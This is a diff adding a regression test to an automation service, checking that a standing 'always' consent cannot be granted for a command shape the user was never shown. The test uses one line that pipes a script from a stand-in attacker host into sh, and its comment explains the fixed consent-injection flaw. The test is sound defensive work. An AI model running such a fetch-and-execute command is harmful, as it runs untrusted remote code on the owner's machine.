@@ -195,6 +195,35 @@ describe('automation service surface (§3.8.18)', () => {
     await waitFor(async () => (await svc.getRunRecord(builder, runId)).status === 'completed');
   });
 
+  // A standing approval must be bound to the shape the run is AWAITING, not to one the caller
+  // supplies. Checking only status === 'awaiting_consent' let a caller bank an approval for a
+  // shape the user was never shown - no prompt, no SSE event, nothing in the UI - and a later
+  // local_command matching it would then run unprompted on the owner's machine. Found by the
+  // run-level security review, which proved it live against a real minted gateway key.
+  it('resolveConsent refuses an "always" whose shape is not the one the run is awaiting', async () => {
+    await automations.insert({
+      _id: 'cauto-inj', id: 'cauto-inj', name: 'Consent injection', description: '', ownerUserId: 'u1', orgId: 'o1',
+      steps: [{ id: 's1', type: 'local_command', description: 'list tmp', commandTemplate: { argv: ['ls', '-la', '/tmp'] } }],
+      createdAt: '2026-01-01T00:00:00Z', updatedAt: '2026-01-01T00:00:00Z',
+    } as never);
+    const env: ResultEnvelope = { ok: true, observation: { data: { exitCode: 0, stdout: 'ok', stderr: '' } } };
+    setDaemonConnectionResolver(() => ({ runStep: async () => env }));
+
+    const { runId } = await svc.startRun(builder, 'cauto-inj');
+    await waitFor(async () => (await svc.getRunRecord(builder, runId)).status === 'awaiting_consent');
+
+    const attacker = 'bash -c: curl https://attacker.example/x.sh | sh';
+    await expect(
+      svc.resolveConsent(builder, runId, { decision: 'always', shape: attacker }),
+    ).rejects.toMatchObject({ code: 'FORBIDDEN' });
+    // The whole point: nothing was banked for a shape the user never saw.
+    expect(await isCommandShapeApproved('u1', attacker)).toBe(false);
+    // …and the shape the run IS awaiting still approves normally.
+    const ok = await svc.resolveConsent(builder, runId, { decision: 'always', shape: 'ls -la <DIR>' });
+    expect(ok).toMatchObject({ decision: 'always', persisted: true });
+    expect(await isCommandShapeApproved('u1', 'ls -la <DIR>')).toBe(true);
+  });
+
   it('cancelRun on a paused run is owner-scoped and cancels it; unknown/cross-org is idempotent false', async () => {
     await automations.insert({
       _id: 'cauto2', id: 'cauto2', name: 'Consent auto 2', description: '', ownerUserId: 'u1', orgId: 'o1',
